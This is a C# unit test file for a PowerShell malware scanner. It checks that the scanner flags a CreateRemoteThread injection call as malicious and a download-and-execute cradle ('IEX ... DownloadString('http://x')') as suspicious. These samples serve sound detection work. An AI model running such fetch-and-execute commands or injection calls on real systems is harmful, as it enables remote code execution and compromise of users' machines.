using System.Linq;
using Detector.Model;
using Detector.PowerShell;
using Xunit;

public class PowerShellScannerTests
{
    [Fact]
    public void Critical_Injection_Api_Is_Malicious()
    {
        // No AMSI available in unit tests; pass null.
        var scanner = new PowerShellScanner(null);
        var findings = scanner.Scan("[K]::CreateRemoteThread($h,0,0,$addr,0,0,0)", "t").ToList();
        Assert.Contains(findings, f => f.Rule == "ps.injection-api" && f.Verdict == Verdict.Malicious);
    }

    [Fact]
    public void Ordinary_Suspicious_Cmdlet_Is_Suspicious_Not_Malicious()
    {
        var scanner = new PowerShellScanner(null);
        var findings = scanner.Scan("IEX (New-Object Net.WebClient).DownloadString('http://x')", "t").ToList();
        Assert.Contains(findings, f => f.Rule == "ps.iex");
        Assert.All(findings, f => Assert.NotEqual(Verdict.Malicious, f.Verdict)); // none are critical here
    }
}
